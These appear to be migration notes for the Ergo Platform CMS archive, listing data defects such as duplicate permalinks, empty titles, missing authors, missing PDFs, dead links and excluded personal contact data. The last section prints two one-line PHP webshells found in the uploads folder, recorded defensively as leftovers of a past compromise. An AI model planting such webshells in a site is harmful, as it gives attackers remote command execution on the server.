# Data notes

Defects found in the CMS archive that affect what gets rendered. Each is recorded
because it is a decision someone should be able to revisit, not because the build
silently papered over it.

## 36 permalinks are claimed by two posts

Each is a `blog` row and a `news` row for the same article, sharing an identical
`permalink`. Only one can own the URL, so the duplicate is exported with
`superseded: true` and generates no route.

**Which one wins is not determined by the data.** Every plausible rule was tested
against what production actually serves, and none explains it:

| Rule | Matches |
|---|---|
| lowest id | 26 / 36 |
| earliest `date` | 26 / 36 |
| earliest `published_at` | 26 / 36 |
| prefer the `blog` row | 26 / 36 |
| latest `updated_at` | 21 / 36 |
| highest id | 10 / 36 |
| prefer the `news` row | 10 / 36 |

This build uses **lowest id**, which matches production on 29 of 36 and is
deterministic. On the 7 below, production renders the other row:

| Route | Rows | Live serves |
|---|---|---|
| `/en/blog/2020-09-25-nfts-on-ergo` | 1250, 1537 | 1537 |
| `/en/blog/2020-12-11-ergo-bootstrap-streamlining-ergo-dapp-infrastructure-with-one-simple-tool` | 1264, 1573 | 1573 |
| `/en/blog/2020-12-18-2021-the-next-battlegrounds-for-defi` | 1265, 1578 | 1578 |
| `/en/blog/2021-11-02-good-whales-grant-fund` | 1358, 1699 | 1699 |
| `/en/blog/2021-12-27-ergo-ama-wrap-up-december-24` | 1383, 1713 | 1713 |
| `/en/blog/2022-01-10-ergo-ama-wrap-up-january-7-2022` | 1391, 1717 | 1717 |
| `/es/blog/2021-11-02-good-whales-grant-fund` | 1744, 2037 | 2037 |

The two rows usually differ only in title — `"Good Whale's Grant Fund"` versus
`Subvenciones de "La Ballena Buena"` is a translation of the same article. The bodies
are the same post.

**The real fix is upstream:** give the `news` twins their own permalinks, or drop the
duplicates. Until then this build is deterministic and matches production 80% of the
time.

## One post has a URL pasted into its slug field

```
id 2568  permalink = github.com/ergoplatform/ergo/releases/tag/v5.0.7
```

An editor pasted a URL into the slug. That path 404s on the live site today, so there
is no working URL to preserve; it is rebuilt from the `url` column as
`Ergo-Reference-Client-5-0-7-Released`. `export-from-db.mjs` reports any such repair.

## 3 posts have an empty title

`export-from-db.mjs` substitutes a dated heading. Production renders an empty `<h1>`.

## 872 posts have no author

The `author` column is empty for most of the archive. `Ergo Platform` is substituted,
which is what production shows.

## `/legal` and `/privacy-policy` render identical text on production

Both pages on the live site render the same seven sections. This looks like a template
bug rather than intent. `src/content/pages/legal.en.md` holds that text;
`privacy-policy.en.md` is a placeholder describing what this static build actually
does, and needs a real policy before launch.

## 14 media files referenced by the CMS are absent from the archive

All PDFs: the whitepaper, the Ergo Script tutorial, and the CBT 2020 papers. Every one
is a superseded row — a later upload of the same document exists under a different
hash and is present. No rendered page references a missing file, because the pages
reference the later hashes.

The original archive `README.txt` flags these as "lost pre-migration". They are lost,
but they are not linked from anything.

## 17 internal links in the archive are dead

They point at sections of the old site (`/wallets/`, `/mobile_wallets/`, `/mining/`),
at posts that were never published, and at three malformed markdown links. Listed in
`scripts/known-broken.mjs`. The other 564 were repaired by `rewrite-links.mjs`.

## `contact_requests` is not imported

544 rows holding names, email addresses and message text. Not part of the website, and
personal data. Deliberately excluded from the export.

## Two PHP webshells in `uploads/`

```
shell_c8157369ab.php     <?php system($_GET['c']); ?>
test_379a40abd7.phtml    <?php system($_GET['c']); ?>
```

Artefacts of an old compromise of the origin server. They are in the archive, absent
from the CMS `files` table, and referenced by no post. `export-media.mjs` does not copy
them. They are worth reporting to whoever operates the CMS host, and it is worth
checking whether PHP execution is still enabled there.
